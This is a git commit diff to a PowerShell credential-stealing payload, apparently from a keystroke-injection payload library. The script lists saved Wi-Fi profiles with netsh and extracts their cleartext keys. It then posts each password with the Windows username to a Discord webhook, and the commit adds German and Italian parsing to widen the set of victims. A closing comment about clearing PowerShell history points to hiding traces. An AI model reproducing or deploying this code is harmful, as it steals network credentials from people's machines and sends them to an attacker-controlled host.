c8e69e6584925a3f9e990c768f1246624e48c2ec
Matthias Altmann <secf00tprint@gmail.com>
2025-03-14 20:53:25 +0100

    Update Windows-Passwords.ps1
    Allow english and german as additional operating systems

--- payloads/library/credentials/WLAN-Windows-Passwords/v.1.0_by_allef_github/Windows-Passwords.ps1
+++ payloads/library/credentials/WLAN-Windows-Passwords/v.1.0_by_allef_github/Windows-Passwords.ps1
@@ -1,15 +1,39 @@
+# Determine system language
+$language = (Get-Culture).TwoLetterISOLanguageName
 
-# ENG
-netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
+switch ($language) {
+    'de' { # German
+        $userProfileString = '(?<=alle Benutzer\s+:\s).+'
+        $keyContentString =  '(?<=sselinhalt\s+:\s).+'
+    }
+    'it' { # Italian
+        $userProfileString = '(?<=Tutti i profili utente\s+:\s).+'
+        $keyContentString = '(?<=Contenuto chiave\s+:\s).+'
+    }
+    default { # Default to English if language is not supported
+        $userProfileString = '(?<=All User Profile\s+:\s).+'
+        $keyContentString = '(?<=Key Content\s+:\s).+'
+    }
+}
+
+netsh wlan show profile | Select-String $userProfileString | ForEach-Object {
     $wlan  = $_.Matches.Value
-    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
+    $passw = netsh wlan show profile $wlan key=clear | Select-String $keyContentString
+    
+    $stripped_pass = ([string]$passw) | Select-String -Pattern ':.*'
+    $stripped_pass = $stripped_pass.Matches.Value
+    $stripped_pass = $stripped_pass.Substring(2) 
+    $Body = @{
+        'username' = $env:username + " | " + [string]$wlan
+        'content' = $stripped_pass
+    }
 
-	$Body = @{
-		'username' = $env:username + " | " + [string]$wlan
-		'content' = [string]$passw
-	}
-	
-	Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
+    # Remove the comments if you want debug it
+    try {
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
+    } catch {
+        Write-Host "Some err: $_"  
+    }
 }
 
 # Clear the PowerShell command history
